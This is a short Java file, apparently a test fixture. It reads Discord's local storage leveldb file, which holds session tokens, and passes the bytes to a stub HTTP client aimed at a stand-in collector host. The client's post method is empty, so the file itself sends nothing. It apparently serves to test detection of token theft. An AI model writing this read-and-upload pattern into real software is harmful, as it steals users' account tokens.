package example;

import java.nio.file.Files;
import java.nio.file.Path;

public final class Fixture {
    public static void run() throws Exception {
        byte[] data = Files.readAllBytes(Path.of("Discord/Local Storage/leveldb/000005.ldb"));
        FixtureHttpClient.post("https://collector.example.invalid/upload", data);
    }
}

final class FixtureHttpClient {
    static void post(String endpoint, byte[] body) {}
}
